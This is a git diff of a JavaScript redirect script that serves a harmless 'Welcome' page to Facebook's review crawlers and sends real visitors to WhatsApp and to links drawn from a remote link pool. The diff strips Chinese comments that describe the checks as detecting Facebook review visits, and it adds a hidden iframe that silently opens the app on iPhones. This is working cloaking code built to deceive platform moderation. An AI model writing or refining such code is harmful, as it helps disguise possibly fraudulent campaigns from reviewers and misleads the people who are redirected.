@@ -16,7 +16,6 @@
 (async () => {
   const ua = navigator.userAgent || "";
 
-  // 检测是否 Facebook 审查访问
   const isFB = 
     ua.includes("FBAN") || 
     ua.includes("FBAV") || 
@@ -24,7 +23,6 @@
     ua.includes("Facebot") ||
     ua.includes("facebookexternalhit");
 
-  // FB 审查访问 → 显示安全页面
   if (isFB) {
     document.body.innerHTML = `
       <h2>Welcome</h2>
@@ -33,7 +31,6 @@
     return;
   }
 
-  // 真人访问 → 从主仓获取链接池
   const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
 
   try {
@@ -49,15 +46,28 @@
     const target = activeLinks[idx].url;
 
     // ========================
-    // 🧠 双跳逻辑（核心）
+    // iPhone 处理：后台先唤醒 APP
     // ========================
+    if (/iPhone|iPad|iPod/i.test(ua)) {
+      // 先让 iPhone 静默尝试打开 APP，不显示弹窗
+      let iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.src = "whatsapp://";
+      document.body.appendChild(iframe);
 
-    // 第1步：尝试激活 WhatsApp APP
-    setTimeout(() => {
-      window.location = "whatsapp://";
-    }, 10);
+      // 如果失败就回跳网页
+      setTimeout(() => {
+        window.location = target;
+      }, 1200);
 
-    // 第2步：如果 APP 没打开 → 退回甲方链接
+      return;
+    }
+
+    // ========================
+    // Android 处理：直接 APP 或网页
+    // ========================
+    window.location = "whatsapp://";
+
     setTimeout(() => {
       window.location = target;
     }, 700);
